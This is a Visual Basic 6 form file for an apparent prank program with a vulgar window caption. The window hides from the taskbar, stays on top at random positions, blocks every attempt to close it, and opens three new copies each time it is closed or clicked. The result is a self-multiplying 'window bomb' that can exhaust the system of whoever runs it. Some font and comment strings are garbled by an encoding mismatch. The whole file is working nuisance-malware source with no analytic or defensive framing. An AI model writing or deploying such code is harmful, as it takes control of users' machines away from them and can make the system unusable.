VERSION 5.00
Begin VB.Form Form2 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "COME TO FUCK THIS WINDOW!!!!!!"
   ClientHeight    =   1485
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   5025
   FillColor       =   &H00FF0000&
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1485
   ScaleWidth      =   5025
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.Label Label1 
      Caption         =   "2333333"
      BeginProperty Font 
         Name            =   "ËÎÌå"
         Size            =   72
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   1455
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4935
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Sub Form_Load()
App.TaskVisible = False
Dim x, y As Long
Randomize Timer
Sleep 100
Randomize Timer + Rnd() * 55
y = Int((Screen.Height / Screen.TwipsPerPixelY) * Rnd() + 1)
Sleep 100
Randomize Timer + Rnd() * 55
x = Int((Screen.Width / Screen.TwipsPerPixelX) * Rnd() + 1)
SetWindowPos Me.hwnd, -1, x, y, 0, 0, 1
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Label1.Caption = "HAHAHA!"
Label1.ForeColor = vbYellow
Sleep 500
Set form2new = New Form2
form2new.Show
Set form2new = New Form2
form2new.Show
Set form2new = New Form2
form2new.Show
Cancel = -1
End Sub

Private Sub Form_Unload(Cancel As Integer)
Cancel = -1
End Sub

Private Sub Label1_Click()
Label1.Caption = "HAHAHA!"
Sleep 500
Set form2new = New Form2
form2new.Show
Set form2new = New Form2
form2new.Show
Set form2new = New Form2
form2new.Show
End Sub
